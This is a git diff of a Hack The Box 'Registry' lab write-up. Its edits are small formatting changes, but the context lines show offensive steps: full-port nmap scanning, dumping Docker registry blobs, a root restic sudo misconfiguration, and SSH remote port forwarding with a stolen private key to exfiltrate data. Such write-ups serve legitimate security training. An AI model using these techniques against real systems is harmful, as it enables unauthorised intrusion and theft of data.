@@ -41,7 +41,8 @@ My go-to tools in this phase, which are typically used by many to start enumerat
 
 Here, I am designating the interface to use when communitcating to the HTB machine (-e) which will be the HTB VPN interface, along with -p to designate the port range to target but I will target ALL TCP and UDP Ports, and the transmission rate of packets per second (--rate).
 
-Similar to this, you could also run something like this: nmap -p- --min-rate=1000 -T4 
+Similar to this, you could also run something like this: 
+```nmap -p- --min-rate=1000 -T4```
 
 2) nmap: I think most people in the information technology and security space know what nmap does. It is a very versatile Port scanning tool which also allows you to use scripts to further target the services found. Just like anything, it can be a useful tool while it can also be damaging if the user is not careful.
 
@@ -453,7 +454,7 @@ The output is what we need, but we need to download each one as a tgz file and t
 
 With this script, we can dump all the blobs we need so we can dig deeper into the files contained on each blob.
 
-### Output:
+### Script Output:
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ ./dockerBlobsDump.sh
 
@@ -752,6 +753,7 @@ User www-data may run the following commands on bolt:
     (root) NOPASSWD: /usr/bin/restic backup -r rest*
 www-data@bolt:~/html/bolt/theme$ 
 ```
+## Data Exfiltration
 
 Something else we need to look at, restic for backups. While looking into this, we found out we must set a restic server locally and initialize the repository (see the resources section).
 
@@ -779,7 +781,7 @@ Having done this, if we try to run the backup command, we cannot connect to the 
 
 At this point, we could also attempt to do SSH Remote Port Forwarding to bind a new service to registry.htb from a **NEW** terminal window:
 
-**SYNTAX:** ssh -R RemotePort:localhost:restPort -i bolt_id_rsa bolt@registry.htb
+**SYNTAX:** ssh -R RemotePort:localhost:RestPort -i bolt_id_rsa bolt@registry.htb
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ ssh -R 61234:localhost:8000 -i /home/kali/Documents/HTB-Labs/Registry/2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/id_rsa bolt@registry.htb
 
